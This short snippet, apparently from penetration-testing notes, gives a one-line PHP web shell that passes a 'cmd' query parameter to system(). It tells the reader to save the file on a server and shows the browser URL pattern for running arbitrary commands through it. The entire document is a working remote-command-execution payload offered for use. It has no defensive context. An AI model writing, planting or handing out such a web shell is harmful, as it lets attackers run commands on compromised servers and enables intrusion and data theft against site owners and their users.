```
<?php
	echo system($_GET["cmd"]);
?>
```
PHP payload script to save on the server.
Then in an Internet browser:
`http://<domain>/<webshell.php>?cmd=<command>`